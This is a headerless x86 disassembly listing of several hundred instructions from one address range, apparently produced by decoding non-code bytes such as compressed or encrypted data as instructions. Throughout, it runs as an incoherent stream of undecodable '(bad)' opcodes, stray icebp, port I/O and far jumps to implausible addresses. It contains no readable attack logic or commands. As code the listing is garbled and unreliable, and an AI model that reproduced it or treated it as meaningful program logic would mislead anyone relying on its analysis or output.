  41bd8d:	icebp  
  41bd8e:	sub    al,0x3c
  41bd90:	fistp  DWORD PTR [ecx-0x6e34887d]
  41bd96:	(bad)  
  41bd97:	ficom  DWORD PTR [edx+0x44c10edb]
  41bd9d:	dec    edx
  41bd9e:	loope  0x41bd76
  41bda0:	add    ah,BYTE PTR [eax]
  41bda2:	(bad)  [ebp-0x3bee3653]
  41bda8:	sbb    ah,0x26
  41bdab:	icebp  
  41bdac:	push   edi
  41bdad:	retf   
  41bdae:	call   FWORD PTR [esi+0x25280d8b]
  41bdb4:	sub    ecx,eax
  41bdb6:	test   DWORD PTR [edi-0x5eff2acf],eax
  41bdbc:	adc    edx,DWORD PTR [eax]
  41bdbe:	mov    dl,0x72
  41bdc0:	ror    al,cl
  41bdc2:	jb     0x41bd56
  41bdc4:	inc    edx
  41bdc5:	dec    edx
  41bdc6:	add    edi,DWORD PTR [esi-0x2ede4c9a]
  41bdcc:	and    bh,BYTE PTR [edx]
  41bdce:	imul   DWORD PTR [edi+0x3e]
  41bdd1:	cmp    bh,bl
  41bdd3:	dec    ebx
  41bdd4:	mov    bl,0x8b
  41bdd6:	(bad)  
  41bdd7:	xchg   edi,eax
  41bdd8:	dec    ebx
  41bdd9:	dec    esi
  41bddb:	scas   eax,DWORD PTR es:[edi]
  41bddc:	xor    DWORD PTR [esi-0x3f129070],0x22d74924
  41bde6:	and    eax,ebp
  41bde8:	xor    eax,0xfebb6e45
  41bded:	aas    
  41bdee:	inc    eax
  41bdef:	rol    dh,cl
  41bdf1:	cmp    eax,0xdce7c6e0
  41bdf6:	repz les ebx,FWORD PTR [ebp+0x5a]
  41bdfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdfb:	repz inc esp
  41bdfd:	jnp    0x41bd9b
  41bdff:	adc    DWORD PTR [esi],ebx
  41be01:	dec    esp
  41be02:	add    DWORD PTR [ecx+0x1],ebp
  41be05:	clc    
  41be06:	adc    bh,BYTE PTR [ecx-0x78]
  41be09:	rol    ah,0xcf
  41be0c:	pop    ebx
  41be0d:	mov    ds:0x86f597ee,eax
  41be12:	adc    DWORD PTR [ebx+eax*4],ecx
  41be15:	lea    edx,[edx+ecx*4]
  41be18:	add    al,0xb7
  41be1a:	mov    al,0x18
  41be1c:	shr    ebx,0x98
  41be1f:	mov    esi,0xfb36ccb9
  41be24:	dec    ebp
  41be25:	in     al,dx
  41be26:	mov    ah,0xcc
  41be28:	addr16 sub ebp,esp
  41be2b:	push   0xffffffb8
  41be2d:	push   edi
  41be2e:	xlat   BYTE PTR ds:[ebx]
  41be2f:	add    BYTE PTR [esi+0x3e],cl
  41be32:	mov    bl,0x13
  41be34:	in     eax,0xe8
  41be36:	adc    esi,DWORD PTR [ebx-0x2103d367]
  41be3c:	inc    esp
  41be3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be3e:	jecxz  0x41be2b
  41be40:	stos   BYTE PTR es:[edi],al
  41be41:	clc    
  41be42:	iret   
  41be43:	mov    ecx,DWORD PTR [ecx+0x16a2664c]
  41be49:	cli    
  41be4a:	idiv   BYTE PTR [ebp-0x34]
  41be4d:	jl     0x41bec5
  41be4f:	sar    ah,1
  41be51:	outs   dx,BYTE PTR ds:[esi]
  41be52:	int3   
  41be53:	js     0x41be0f
  41be55:	lahf   
  41be56:	push   esi
  41be57:	loop   0x41bec7
  41be59:	outs   dx,DWORD PTR ds:[esi]
  41be5a:	xor    ebp,DWORD PTR [eax-0xf]
  41be5d:	popf   
  41be5e:	inc    edi
  41be5f:	addr16 out 0x4e,eax
  41be62:	jbe    0x41beaa
  41be64:	stos   BYTE PTR es:[edi],al
  41be65:	pop    ds
  41be66:	pusha  
  41be67:	jmp    DWORD PTR ds:0xff06bd25
  41be6d:	xchg   esp,eax
  41be6e:	fst    st(2)
  41be70:	repz cs loope 0x41bee2
  41be74:	popf   
  41be75:	mov    ds:0x101ad6f0,eax
  41be7a:	not    BYTE PTR [eax-0x18]
  41be7d:	or     eax,0xf4aa639f
  41be82:	or     al,BYTE PTR [esp+eax*8-0x3c]
  41be86:	jbe    0x41beb3
  41be88:	cwde   
  41be89:	jecxz  0x41bede
  41be8b:	sub    eax,esp
  41be8d:	inc    edi
  41be8e:	xchg   DWORD PTR [edi-0x16],ebx
  41be91:	test   BYTE PTR [eax-0x18],bh
  41be94:	jle    0x41be7c
  41be96:	rcr    BYTE PTR [ebp+0x68],cl
  41be99:	out    0xaf,al
  41be9b:	das    
  41be9c:	or     al,0x14
  41be9e:	mov    edx,0xc3b62ee3
  41bea3:	mov    esi,0xd1df13f3
  41bea8:	jo     0x41bf1f
  41beaa:	add    al,0x5a
  41beac:	adc    bh,BYTE PTR [eax]
  41beae:	repnz out 0x36,al
  41beb1:	rol    BYTE PTR [ebx-0x2f],cl
  41beb4:	inc    eax
  41beb5:	scas   eax,DWORD PTR es:[edi]
  41beb6:	or     DWORD PTR [edi+0x24],esi
  41beb9:	dec    esi
  41beba:	popa   
  41bebb:	loope  0x41bedc
  41bebd:	fsubp  st(7),st
  41bebf:	aad    0xca
  41bec1:	call   0x1716e516
  41bec6:	or     ebp,edi
  41bec8:	adc    DWORD PTR [edi+0x7a],ecx
  41becb:	ret    
  41becc:	(bad)  
  41becd:	fnsetpm(287 only) 
  41becf:	xlat   BYTE PTR ds:[ebx]
  41bed0:	mov    ds:0x538a7785,al
  41bed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bed6:	pop    esp
  41bed7:	test   eax,0x90c40f4a
  41bedc:	cli    
  41bedd:	or     ebp,DWORD PTR [edx-0x4a]
  41bee0:	and    BYTE PTR [edx-0x4b],0xb3
  41bee4:	popa   
  41bee5:	add    bl,ah
  41bee7:	sbb    al,0xbb
  41bee9:	dec    ebp
  41beea:	les    edx,FWORD PTR [esi+0x52]
  41beed:	lods   al,BYTE PTR ds:[esi]
  41beee:	loop   0x41beac
  41bef0:	(bad)  
  41bef1:	loop   0x41befb
  41bef3:	xchg   edx,eax
  41bef4:	cmp    al,BYTE PTR [ebx-0x67]
  41bef7:	mov    WORD PTR ss:[edi+0x1f569180],?
  41befe:	fcom   QWORD PTR [esi+0x49547371]
  41bf04:	inc    ecx
  41bf05:	jb     0x41bea5
  41bf07:	js     0x41beed
  41bf09:	ds pop esp
  41bf0b:	xchg   ebp,eax
  41bf0c:	lods   eax,DWORD PTR ds:[esi]
  41bf0d:	bound  ebp,QWORD PTR [ebx+ebp*8]
  41bf10:	jmp    0x28b7:0x69a2c8ca
  41bf17:	popf   
  41bf18:	pop    edi
  41bf19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf1a:	inc    ecx
  41bf1b:	pop    edi
  41bf1c:	push   edi
  41bf1d:	je     0x41bf5e
  41bf1f:	iret   
  41bf20:	xchg   esi,eax
  41bf21:	cwde   
  41bf22:	xor    BYTE PTR [ebx+ebx*4-0x67],al
  41bf26:	pop    ds
  41bf27:	in     eax,0x30
  41bf29:	test   BYTE PTR [edi-0x5078fa35],dl
  41bf2f:	pop    esp
  41bf30:	lahf   
  41bf31:	xor    BYTE PTR [ecx-0x64a46809],ah
  41bf37:	adc    edi,DWORD PTR [esi-0x111679f9]
  41bf3d:	mov    ebx,0x7b0b5147
  41bf42:	mov    ds:0xd704844a,eax
  41bf47:	test   eax,0xe7639967
  41bf4c:	jp     0x41bf2a
  41bf4e:	jbe    0x41bf01
  41bf50:	repnz inc edi
  41bf52:	(bad)  
  41bf53:	jne    0x41beff
  41bf55:	sahf   
  41bf56:	jno    0x41bf62
  41bf58:	xchg   ebx,eax
  41bf59:	add    eax,0x84fcd580
  41bf5e:	out    dx,al
  41bf5f:	gs dec ecx
  41bf61:	push   ds
  41bf62:	jmp    0xfc52:0xc87fde38
  41bf69:	cmp    DWORD PTR [edi],edx
  41bf6b:	scas   eax,DWORD PTR es:[edi]
  41bf6c:	ss sbb al,0x25
  41bf6f:	icebp  
  41bf70:	mov    ah,0x9b
  41bf72:	das    
  41bf73:	lock jmp 0xead8:0x7f5c8843
  41bf7b:	pop    edx
  41bf7c:	add    bh,ah
  41bf7e:	cld    
  41bf7f:	pop    edx
  41bf80:	mov    dl,0xd7
  41bf82:	icebp  
  41bf83:	in     al,0x62
  41bf85:	xor    al,0x67
  41bf87:	xor    eax,eax
  41bf89:	mov    eax,ds:0x2c577a50
  41bf8e:	gs jmp 0x338d2beb
  41bf94:	push   ds
  41bf95:	push   ecx
  41bf96:	mov    BYTE PTR [ebx],al
  41bf98:	jge    0x41bf30
  41bf9a:	hlt    
  41bf9b:	pusha  
  41bf9c:	xchg   ebp,eax
  41bf9d:	mov    al,ds:0x31cb76ab
  41bfa2:	or     eax,DWORD PTR [esi+ecx*1+0xb]
  41bfa6:	push   cs
  41bfa7:	icebp  
  41bfa8:	inc    eax
  41bfa9:	fsub   DWORD PTR [esp+edi*8-0x5df138c5]
  41bfb0:	ret    
  41bfb1:	push   es
  41bfb2:	fs push edx
  41bfb4:	add    eax,DWORD PTR [edi+0xd]
  41bfb7:	xchg   ebx,eax
  41bfb8:	xchg   edi,eax
  41bfb9:	jno    0x41bfc0
  41bfbb:	xchg   ebp,eax
  41bfbc:	or     BYTE PTR [ebp-0x43dc27c6],ch
  41bfc2:	xchg   esi,eax
  41bfc3:	lods   eax,DWORD PTR ds:[esi]
  41bfc4:	pop    esi
  41bfc5:	pop    ebp
  41bfc6:	push   eax
  41bfc7:	call   esp
  41bfc9:	(bad)  
  41bfca:	(bad)  
  41bfcb:	mov    BYTE PTR [ebx-0x3359c625],cl
  41bfd1:	data16 jb 0x41bfec
  41bfd4:	dec    ecx
  41bfd5:	jg     0x41bfb5
  41bfd7:	aad    0xf7
  41bfd9:	xchg   edi,eax
  41bfda:	mov    bl,0x1e
  41bfdc:	mov    BYTE PTR [edx-0x521d94c2],ch
  41bfe2:	xchg   ax,ax
  41bfe4:	sbb    BYTE PTR [edx+ebp*2],0x5b
  41bfe8:	pop    ebx
  41bfe9:	fs xchg ebx,eax
  41bfeb:	fisubr DWORD PTR [ecx+0x68]
  41bfee:	scas   al,BYTE PTR es:[edi]
  41bfef:	stc    
  41bff0:	and    eax,0x5b4a1dd3
  41bff5:	cli    
  41bff6:	cld    
  41bff7:	daa    
  41bff8:	inc    esi
  41bff9:	iret   
  41bffa:	pop    ss
  41bffb:	add    BYTE PTR [esp+ebp*1],dl
  41bffe:	out    dx,al
  41bfff:	jg     0x41c049
  41c001:	fstp   DWORD PTR [edi]
  41c003:	mov    bl,0x30
  41c005:	adc    DWORD PTR [ecx-0x47d27605],0xfe60f03
  41c00f:	dec    esp
  41c010:	sbb    eax,DWORD PTR [edx-0x1d7124cd]
  41c016:	int3   
  41c017:	xchg   ecx,eax
  41c018:	popf   
  41c019:	xchg   edi,eax
  41c01a:	add    eax,0xfebc920d
  41c01f:	sub    edx,ebp
  41c021:	adc    DWORD PTR [ebx],eax
  41c023:	mov    ah,0xe3
  41c025:	sub    DWORD PTR [eax+0x5f06f995],edi
  41c02b:	add    eax,DWORD PTR [ebx-0x42d52414]
  41c031:	xchg   esp,eax
  41c032:	jae    0x41c081
  41c034:	xchg   DWORD PTR [ecx+eiz*4-0x42],esi
  41c038:	nop
  41c039:	cld    
  41c03a:	mov    esp,0x1ec3e678
  41c03f:	ret    0x2e82
  41c042:	(bad)  
  41c043:	jle    0x41c03c
  41c045:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41c047:	aaa    
  41c048:	stos   DWORD PTR es:[edi],eax
  41c049:	inc    edx
  41c04a:	out    0x33,al
  41c04c:	add    esp,DWORD PTR [ebp-0x2c]
  41c04f:	dec    ebp
  41c050:	fidiv  WORD PTR [edi-0x173e7eba]
  41c056:	mov    esi,0xe187bf43
  41c05b:	pop    esi
  41c05c:	adc    al,0x1a
  41c05e:	mov    edi,0xc1b6cc55
  41c063:	or     al,0xa3
  41c065:	jno    0x41c01f
  41c067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c068:	fidivr DWORD PTR [esi-0x5d]
  41c06b:	cmp    esp,DWORD PTR [edx+ecx*8-0x794a5c77]
  41c072:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41c074:	add    dl,BYTE PTR [ecx]
  41c076:	pop    ss
  41c077:	and    al,0xc8
  41c079:	ss (bad) 
  41c07b:	xchg   esi,eax
  41c07c:	jmp    0x41c04b
  41c07e:	cwde   
  41c07f:	cs push edx
  41c081:	xchg   esp,eax
  41c082:	xchg   ebx,eax
  41c083:	inc    ebp
  41c084:	adc    eax,0xbdec4447
  41c089:	push   0x6d8bdf9a
  41c08e:	jae    0x41c07c
  41c090:	cmp    ah,0x4e
  41c093:	aas    
  41c094:	das    
  41c095:	ret    
  41c096:	push   ebp
  41c097:	inc    BYTE PTR [esi+0x34]
  41c09a:	mov    ecx,0xe0b11957
  41c09f:	dec    edi
  41c0a0:	sub    al,0xe0
  41c0a2:	mov    cl,0x40
  41c0a4:	out    dx,al
  41c0a5:	or     bl,BYTE PTR gs:[edx]
  41c0a8:	or     ebx,edi
  41c0aa:	and    BYTE PTR [edx-0x64],al
  41c0ad:	into   
  41c0ae:	add    al,0xa9
  41c0b0:	jmp    0xe886fa78
  41c0b5:	add    al,0x67
  41c0b7:	dec    ebx
  41c0b8:	dec    esp
  41c0b9:	retf   0x8b39
  41c0bc:	adc    DWORD PTR [ebp-0x45f71a04],eax
  41c0c2:	addr16 dec ebx
  41c0c4:	dec    esi
  41c0c5:	jns    0x41c10f
  41c0c7:	dec    ecx
  41c0c8:	inc    ebp
  41c0c9:	cwde   
  41c0ca:	xchg   ebp,eax
  41c0cc:	xchg   edi,eax
  41c0cd:	pop    edx
  41c0ce:	sar    DWORD PTR [esi+ebx*4+0x6d],1
  41c0d2:	mov    dl,0x85
  41c0d4:	pop    esp
  41c0d5:	push   ds
  41c0d6:	add    ecx,DWORD PTR [eax+0x63465392]
  41c0dc:	inc    ecx
  41c0dd:	xor    eax,0xff244d48
  41c0e2:	outs   dx,DWORD PTR ds:[si]
  41c0e4:	scas   al,BYTE PTR es:[edi]
  41c0e5:	mov    esi,0xc4930950
  41c0ea:	xchg   bh,bl
  41c0ec:	fcomp  DWORD PTR [edx]
  41c0ee:	pop    esi
  41c0ef:	outs   dx,DWORD PTR ds:[esi]
  41c0f0:	mov    BYTE PTR [ecx+eax*2],bl
  41c0f3:	inc    eax
  41c0f4:	cmp    dl,BYTE PTR [ebp-0x4a763ebc]
  41c0fa:	pop    edi
  41c0fb:	test   BYTE PTR [edi-0x608c94cc],ah
  41c101:	fdiv   QWORD PTR [edi]
  41c103:	cmp    ch,dl
  41c105:	jmp    0xed74:0x8cdc9fe8
  41c10c:	ret    
  41c10d:	fs cmp eax,0xe2debb56
  41c113:	in     eax,dx
  41c114:	push   DWORD PTR [eax+edi*2]
  41c117:	push   0x5a836fdf
  41c11c:	pop    ds
  41c11d:	inc    eax
  41c11e:	fwait
  41c11f:	les    edx,FWORD PTR [ebx+0x33a42ad6]
  41c125:	dec    eax
  41c126:	loop   0x41c10e
  41c128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c129:	retf   
  41c12a:	sbb    dh,BYTE PTR [esi+0x40]
  41c12d:	fs pop edi
  41c12f:	es imul ebx,ebx
  41c133:	xchg   edi,eax
  41c134:	hlt    
  41c135:	adc    DWORD PTR [ecx+0x76],ebp
  41c138:	inc    eax
  41c13a:	mov    fs,ecx
  41c13c:	ror    al,1
  41c13e:	sub    BYTE PTR [eax],ch
  41c140:	jge    0x41c15c
  41c142:	xchg   ecx,eax
  41c143:	push   ebp
  41c144:	mov    esi,0x7deaffe
  41c149:	rol    eax,cl
  41c14b:	not    cl
  41c14d:	push   eax
  41c14e:	xchg   BYTE PTR [ebx],bh
  41c150:	(bad)  
  41c151:	mov    eax,0x93761390
  41c156:	icebp  
  41c157:	cs jne 0x41c0e5
  41c15a:	lods   eax,DWORD PTR ds:[esi]
  41c15b:	jmp    0x6f86:0x39a8c5d6
  41c162:	mov    fs,eax
  41c164:	mov    esp,0x68a28511
  41c169:	or     ah,0x96
  41c16c:	fdivr  st(4),st
  41c16e:	repz in eax,dx
  41c170:	jl     0x41c0f8
  41c172:	mov    bh,0x19
  41c174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c175:	inc    edi
  41c176:	mov    edx,0x91fbbc31
  41c17b:	repnz rcr WORD PTR [eax-0x7e],0xed
  41c181:	push   edx
  41c182:	mov    dh,0x2b
  41c184:	cmp    bh,BYTE PTR [ebx+ecx*8]
  41c187:	call   0x8b377754
  41c18c:	(bad)  
  41c18d:	int    0x6c
  41c18f:	mov    ch,dh
  41c191:	(bad)  
  41c192:	sar    BYTE PTR [edx+0x7a1aeb34],cl
  41c198:	cld    
  41c199:	pop    es
  41c19a:	inc    esi
  41c19b:	mov    WORD PTR [edx+0x144ee537],ss
  41c1a1:	mov    ch,0x1f
  41c1a3:	and    eax,0x297689a5
  41c1a8:	fst    DWORD PTR [ebx]
  41c1aa:	or     esi,DWORD PTR [esi+0x37]
  41c1ad:	inc    ebp
  41c1ae:	in     ax,0xc9
  41c1b1:	in     eax,dx
  41c1b2:	pop    eax
  41c1b3:	js     0x41c183
  41c1b5:	sub    eax,DWORD PTR [esi-0x5a87ee15]
  41c1bb:	inc    esi
  41c1bc:	sti    
  41c1bd:	xchg   edx,eax
  41c1be:	pop    ss
  41c1bf:	add    esi,DWORD PTR [eax-0x17411e95]
  41c1c5:	mov    bl,0xc6
  41c1c7:	or     BYTE PTR [edi+0x267f70ad],0xb7
  41c1ce:	adc    edx,DWORD PTR [ecx+0x9]
  41c1d1:	test   ebp,esp
  41c1d3:	in     al,0x6c
  41c1d5:	and    DWORD PTR [ebp+0x62],eax
  41c1d8:	xchg   BYTE PTR [edi-0x501300b3],al
  41c1de:	mov    esp,edi
  41c1e0:	sbb    BYTE PTR [esp+edx*8+0x3a4a39ec],bl
  41c1e7:	cwde   
  41c1e8:	sahf   
  41c1e9:	jns    0x41c245
  41c1eb:	mov    ebp,0xe453ae
  41c1f0:	stc    
  41c1f1:	fs and ebp,ebx
  41c1f4:	inc    ebp
  41c1f5:	sub    edi,ecx
  41c1f7:	ror    BYTE PTR [ebx],1
  41c1f9:	pop    ebp
  41c1fa:	inc    ebx
  41c1fb:	call   0x89775cf0
  41c200:	mov    esp,0x727821a
  41c205:	and    BYTE PTR [esi+0x6a],bl
  41c208:	xor    al,0xb1
  41c20a:	call   0x7e3e5778
  41c20f:	xor    DWORD PTR ds:0x8f511c80,esi
  41c215:	test   eax,0x4b1da706
  41c21a:	xor    edi,DWORD PTR [edx-0x2cf0f593]
  41c220:	fwait
  41c221:	xchg   esp,eax
  41c222:	xor    eax,0xdc610766
  41c227:	add    ah,BYTE PTR [ecx-0x11f6bfa4]
  41c22d:	or     BYTE PTR [edx-0x34b8724f],dl
  41c233:	call   0x428b7bf5
  41c238:	xchg   edi,eax
  41c239:	clc    
  41c23a:	and    BYTE PTR [eax],ch
  41c23c:	cmp    bl,BYTE PTR [ecx+0x55b3d707]
  41c242:	dec    edx
  41c243:	leave  
  41c244:	sub    DWORD PTR [ecx-0xf],edx
  41c247:	xchg   DWORD PTR ds:0x6245574c,eax
  41c24d:	lods   al,BYTE PTR ds:[esi]
  41c24e:	jge    0x41c29c
  41c250:	leave  
  41c251:	add    DWORD PTR [ebx+ebp*1-0xb],esi
  41c255:	push   edi
  41c256:	add    DWORD PTR [esi-0x7155793c],ebx
  41c25c:	std    
  41c25d:	adc    BYTE PTR [ebx],dh
  41c25f:	outs   dx,BYTE PTR ds:[esi]
  41c260:	jmp    0x41c239
  41c262:	es sub al,0x1
  41c265:	xchg   BYTE PTR [esi],ah
  41c267:	xchg   esi,eax
  41c268:	popa   
  41c269:	fld    DWORD PTR [esi]
  41c26b:	pop    ebp
  41c26c:	xchg   esp,eax
  41c26d:	xor    dl,BYTE PTR [esi+0x1c]
  41c270:	xchg   edx,eax
  41c271:	dec    esi
  41c272:	cmp    al,0x57
  41c274:	lahf   
  41c275:	out    dx,eax
  41c276:	aam    0xda
  41c278:	call   FWORD PTR [esi-0x301e78e1]
  41c27e:	fstp   TBYTE PTR [ebx]
  41c280:	sbb    al,0xb0
  41c282:	outs   dx,BYTE PTR ds:[esi]
  41c283:	jmp    0x41c29a
  41c285:	xor    eax,0x6a82a0a8
  41c28a:	fs and eax,0x49185844
  41c290:	sti    
  41c291:	ret    0x67a
  41c294:	ret    
  41c295:	outs   dx,BYTE PTR ds:[esi]
  41c296:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c298:	sahf   
  41c299:	dec    ebp
  41c29a:	mov    bl,0xe3
  41c29c:	or     eax,0x8d94bf04
  41c2a1:	inc    edx
  41c2a2:	stos   DWORD PTR es:[edi],eax
  41c2a3:	sbb    al,0x5e
  41c2a5:	(bad)  
  41c2a6:	jmp    0x41c2e0
  41c2a8:	sahf   
  41c2a9:	adc    dh,BYTE PTR [ebp+ebx*2-0x711836e3]
  41c2b0:	ins    DWORD PTR es:[edi],dx
  41c2b1:	or     DWORD PTR [edx+0x8],eax
  41c2b4:	dec    ebx
  41c2b5:	adc    eax,0xa0bbe655
  41c2ba:	retf   
  41c2bb:	xor    BYTE PTR [ebx],dl
  41c2bd:	in     eax,0x8b
  41c2bf:	mov    esi,0xdcbb5fbb
  41c2c4:	jg     0x41c330
  41c2c6:	fild   WORD PTR [ebx]
  41c2c8:	out    dx,eax
  41c2c9:	ror    DWORD PTR [eax+0x71],0xaf
  41c2cd:	pop    ebp
  41c2ce:	xor    al,0xe6
  41c2d0:	pop    eax
  41c2d1:	jo     0x41c27b
  41c2d3:	xchg   ecx,eax
  41c2d4:	inc    eax
  41c2d5:	push   edi
  41c2d6:	popf   
  41c2d7:	sbb    DWORD PTR [ebx-0x64],edi
  41c2da:	ss push eax
  41c2dc:	inc    ebx
  41c2dd:	sub    al,0x2a
  41c2df:	mov    esp,0xe6516a91
  41c2e4:	scas   al,BYTE PTR es:[edi]
  41c2e5:	mov    dh,0xef
  41c2e7:	stc    
  41c2e8:	cdq    
  41c2e9:	or     BYTE PTR ds:0x2041ba68,0x3c
  41c2f0:	xchg   ebp,eax
  41c2f1:	out    dx,al
  41c2f2:	sub    al,0x21
  41c2f4:	adc    edi,edx
  41c2f6:	(bad)
  41c2f9:	add    al,0x40
  41c2fb:	sub    eax,DWORD PTR [edi-0x1011c95a]
  41c301:	sbb    BYTE PTR [edi],0xd9
  41c304:	mov    esi,0x142e4956
  41c309:	add    ch,BYTE PTR [ebx+0x61dc89b6]
  41c30f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c310:	leave  
  41c311:	pop    ebp
  41c312:	lds    ebp,FWORD PTR [ecx]
  41c314:	jbe    0x41c390
  41c316:	imul   ebx,DWORD PTR [ebx+0x6e],0xfb98d0b0
  41c31d:	mov    bl,BYTE PTR [ebp-0x2696ac1b]
  41c323:	aad    0x7e
  41c325:	push   ebp
  41c326:	lds    esp,FWORD PTR [ebp-0x26e88618]
  41c32c:	push   edx
  41c32d:	adc    ch,BYTE PTR [ebx-0x49]
  41c330:	in     al,dx
  41c331:	lahf   
  41c332:	sbb    al,BYTE PTR [ebp+0x5d]
  41c335:	outs   dx,BYTE PTR ds:[esi]
  41c336:	(bad)  
  41c337:	sti    
  41c338:	pop    ss
  41c339:	dec    edi
  41c33a:	and    DWORD PTR [eax-0x24],edx
  41c33d:	jg     0x41c2d6
  41c33f:	js     0x41c39b
  41c341:	jbe    0x41c30f
  41c343:	jl     0x41c34a
  41c345:	(bad)  
  41c346:	icebp  
  41c347:	mov    bh,0x97
  41c349:	jb     0x41c2ea
  41c34b:	ins    BYTE PTR es:[edi],dx
  41c34c:	cli    
  41c34d:	bound  esi,QWORD PTR [esi]
  41c34f:	repnz shl BYTE PTR [edi-0x1f],1
  41c353:	(bad)  
  41c354:	cld    
  41c355:	ins    DWORD PTR es:[edi],dx
  41c356:	pop    ds
  41c357:	sar    DWORD PTR [eax+0x47d9eddc],cl
  41c35d:	add    eax,0xf82ec863
  41c362:	dec    edi
  41c363:	bt     DWORD PTR [eax],ebx
  41c366:	mov    esp,0xe0d6fd45
  41c36b:	(bad)  
  41c36c:	or     ebp,DWORD PTR [edi+0x1cba2fe1]
  41c372:	pusha  
  41c373:	lods   eax,DWORD PTR ds:[esi]
  41c374:	cmp    BYTE PTR [ebp-0x158f7201],bl
  41c37a:	sbb    dl,bh
  41c37c:	jmp    0xa29ad60d
  41c381:	inc    edi
  41c382:	ds int 0x5
  41c385:	mov    esp,0x11d55e87
  41c38a:	retf   0xf73f
  41c38d:	sub    esp,edx
  41c38f:	jmp    0x2b30:0xc092c1a1
  41c396:	xor    BYTE PTR ss:[ebx+0x7d],ch
  41c39a:	pop    ebp
  41c39b:	dec    eax
  41c39c:	jmp    0x2109ddb3
  41c3a1:	xor    ebx,ecx
  41c3a3:	push   0xffffff8e
  41c3a5:	mov    edx,0x725cc0c
  41c3aa:	dec    edi
  41c3ab:	or     eax,0x575a4de7
  41c3b0:	stos   BYTE PTR es:[edi],al
  41c3b1:	loopne 0x41c3d0
  41c3b3:	popa   
  41c3b4:	mov    al,0x79
  41c3b6:	inc    ebp
  41c3b7:	pop    ebx
  41c3b8:	sahf   
  41c3b9:	and    DWORD PTR ds:0x2f63dc12,ecx
  41c3bf:	pop    ebx
  41c3c0:	dec    ecx
  41c3c1:	cmp    al,BYTE PTR [eax+0x68238255]
  41c3c7:	mov    al,0xa2
  41c3c9:	adc    BYTE PTR [esi],ah
  41c3cb:	sbb    edx,DWORD PTR [esi]
  41c3cd:	jge    0x41c38c
  41c3cf:	xor    al,0x3a
  41c3d1:	cdq    
  41c3d2:	jp     0x41c43c
  41c3d4:	(bad)  
  41c3d5:	lods   eax,DWORD PTR ds:[esi]
  41c3d6:	out    0x9a,al
  41c3d8:	inc    edx
  41c3d9:	pop    DWORD PTR [ecx]
  41c3db:	mov    eax,0xd7d13dda
  41c3e0:	inc    edx
  41c3e1:	push   cs
  41c3e2:	jge    0x41c407
  41c3e4:	push   ecx
  41c3e5:	daa    
  41c3e6:	ret    0x6b9b
  41c3e9:	leave  
  41c3ea:	adc    bl,dh
  41c3ec:	or     esp,DWORD PTR [ecx+0x3b]
  41c3ef:	pop    ss
  41c3f0:	add    bh,BYTE PTR ds:0x2a1376fe
  41c3f6:	ins    BYTE PTR es:[edi],dx
  41c3f7:	retf   0x69c8
  41c3fa:	mov    eax,edi
  41c3fc:	mov    edi,0x5dedc967
  41c401:	add    ebp,DWORD PTR [esi+0x2752b96a]
  41c407:	lock jns 0x41c443
  41c40a:	fwait
  41c40b:	xchg   esp,eax
  41c40c:	(bad)  
  41c40d:	fisttp DWORD PTR [eax-0x981ad0]
  41c413:	mov    ecx,0xeb7e55b
  41c418:	cld    
  41c419:	mov    edi,0x54687781
  41c41e:	test   DWORD PTR [esi-0x27a246c6],0x76e673a0
  41c428:	dec    ebp
  41c429:	cli    
  41c42a:	ins    BYTE PTR es:[edi],dx
  41c42b:	xor    ecx,DWORD PTR [ebp+edx*1+0x3c]
  41c42f:	mov    ecx,0xd8730d1b
  41c434:	hlt    
  41c435:	cmc    
  41c436:	aam    0x3a
  41c438:	xor    ah,BYTE PTR [edi+0x1849df7]
  41c43e:	ds test edi,ecx
  41c441:	ja     0x41c41e
  41c443:	js     0x41c3f2
  41c445:	sbb    DWORD PTR [edi],0x9fde5f0b
  41c44b:	(bad)  
  41c44c:	repnz mov bl,0xfc
  41c44f:	mov    esp,DWORD PTR [ebx+0x14]
  41c452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c453:	repnz mov bl,0x95
  41c456:	rcr    DWORD PTR [edx],cl
  41c458:	mov    edx,0xf95f7e71
  41c45d:	(bad)  
  41c45e:	pop    ecx
  41c45f:	mov    ebp,0x29f03ecf
  41c464:	ficom  WORD PTR [ebx]
  41c466:	(bad)  
  41c468:	test   eax,0xc0b10c42
  41c46d:	sbb    ebp,eax
  41c46f:	dec    ebp
  41c470:	cmp    DWORD PTR [ecx],esi
  41c472:	addr16 pop eax
  41c474:	push   cs
  41c475:	retf   0x217f
  41c478:	or     eax,0x25c41c69
  41c47d:	dec    ebx
  41c47e:	ins    BYTE PTR es:[edi],dx
  41c47f:	rol    BYTE PTR [eax-0x3d],cl
  41c482:	sbb    DWORD PTR [edx+0x6b7e7619],edi
  41c488:	add    esp,DWORD PTR [ebp+0x63]
  41c48b:	icebp  
  41c48c:	and    ecx,esi
  41c48e:	and    eax,0xa7879940
  41c493:	jmp    0x1f90:0xe1e0a68a
  41c49a:	xor    BYTE PTR [eax-0x44aadb26],dh
  41c4a0:	mov    ds:0x5a2f6477,eax
  41c4a5:	cli    
  41c4a6:	into   
  41c4a7:	inc    edx
  41c4a8:	xor    BYTE PTR [ebp-0x4ef557c2],dh
  41c4ae:	mov    esi,0x2cb379a0
  41c4b3:	das    
  41c4b4:	jnp    0x41c439
  41c4b6:	repz imul esi,esi,0xffffffa1
  41c4ba:	dec    esp
  41c4bb:	add    BYTE PTR [eax+0x44],bh
  41c4be:	dec    edx
  41c4bf:	jns    0x41c45a
  41c4c1:	ror    BYTE PTR [eax],1
  41c4c3:	cli    
  41c4c4:	mov    eax,0xc0723f6f
  41c4c9:	mov    esi,0x5a3f24c7
  41c4ce:	ret    
  41c4cf:	mov    esi,0xc826315a
  41c4d4:	inc    ecx
  41c4d5:	add    BYTE PTR [edx],bl
  41c4d7:	ins    BYTE PTR es:[edi],dx
  41c4d8:	sbb    eax,0xef0f162f
  41c4dd:	jns    0x41c530
  41c4df:	xor    BYTE PTR [esi],bl
  41c4e1:	inc    edx
